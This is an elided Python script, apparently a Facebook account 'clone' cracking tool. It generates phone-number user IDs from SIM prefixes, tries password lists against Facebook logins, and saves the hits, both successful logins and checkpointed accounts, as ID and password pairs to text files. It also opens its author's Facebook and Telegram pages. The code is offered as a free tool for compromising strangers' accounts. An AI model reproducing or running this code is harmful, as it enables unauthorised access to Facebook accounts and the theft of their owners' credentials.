...
os.system('xdg-openhttps://www.facebook.com/profile.php?id=100057684345740')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://www.facebook.com/profile.php?id=100057684345740')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
4D 65 72 61 6A  68 61 63 6B 65 72 
  ─────────────────────────────────────────────────    
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 \033[1;34m┃ [✓] AUTHOR       \033[1;91m: \033[1;92mAhmad Meraj         
 \033[1;34m┃ [✓] TOOL         \033[1;91m: \033[1;92mRANDOM CLONE                
 \033[1;34m┃ [✓] STATUS       \033[1;91m: \033[1;92mFREE                        
 \033[1;34m┃ [✓] SYSTEM       \033[1;91m: \033[1;92mjust mobile data working!              
 \033[1;34m┃ [✓] GITHUB       \033[1;91m: \033[1;92mhacker_Meraj
 \033[1;34m┃ [✓] FACEBOOK     \033[1;91m: \033[1;92mShahzada Meraj 
 \033[1;34m┃ [✓] best friends \033[1;91m: \033[1;92m Allah 
 \033[1;34m┃ [✓] my name      \033[1;91m: \033[1;92mAhmad Meraj 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open https://https://t.me/AhmadHack115')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100057684345740');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9378,9379,9376,9370,9377،****Etc')
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,2000,3000,4000,5000,10000,****Etc')
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9378,9379,9377,9370,9374,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
...
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9378,9379,9377,9370,9376,,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Subhan Allah🤍-OK] '+cid+'|'+ps+'\033[0;97m')
                open('Subhan Allah🤍-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ya Allah🤲-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ya Allah🤲-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mAhmad-Meraj\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
